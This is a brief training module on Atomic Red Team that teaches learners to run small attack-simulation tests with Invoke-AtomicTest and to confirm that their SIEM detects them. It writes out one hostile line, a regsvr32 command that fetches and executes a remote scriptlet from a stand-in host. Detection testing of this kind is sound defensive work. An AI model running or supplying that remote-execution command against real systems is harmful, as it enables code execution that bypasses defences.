# Atomic Testing Fundamentals

## 1. Orientation

### What this module covers
This module covers **Atomic Red Team** (ART). The industry standard for small, discrete tests.

### Fit in the Learning Path
"Run Test T1003". ART provides the script to do exactly that.

### Learning Objectives
By the end of this module, you should understand:
*   **The Atom**: One technique, one script.
*   **Execution Frameworks** (Invoke-Atomic).
*   **Prerequisites**.

## 2. Core Content

### What is an Atomic?
A YAML file defining a specific attack test.
*   **Name**: Regsvr32.
*   **Attack**: `regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll`
*   **Cleanup**: Kill process.

### Why Small?
*   Easier to debug.
*   Easier to attribute logs.
*   "If I run 50 attacks at once, I don't know which one triggered the alert."

## 3. Guided Practice

### Running an Atomic
**Test**: T1033 (System Owner/User Discovery).
**Command**: `whoami`.

1.  Download Atomic Red Team.
2.  Run: `Invoke-AtomicTest T1033`.
3.  Check SIEM. Did it see `whoami`?

**Test**: T1059 (PowerShell).
1.  Run: `Invoke-AtomicTest T1059`.
2.  Check SIEM. Did it see the encoded command?

## 4. Reflection Check

1.  **Coverage**: ART covers 80% of MITRE. It's an amazing free resource.
2.  **Automation**: You can schedule these to run weekly. (Regression Testing).
3.  **Risk**: Some Atomics change system state (Disable Firewall). Read the code before running!

## 5. Completion Criteria

This module is complete when:
1.  You have downloaded **Atomic Red Team**.
2.  You have run **Invoke-AtomicTest**.
3.  You verify detection for a simple technique like `whoami`.
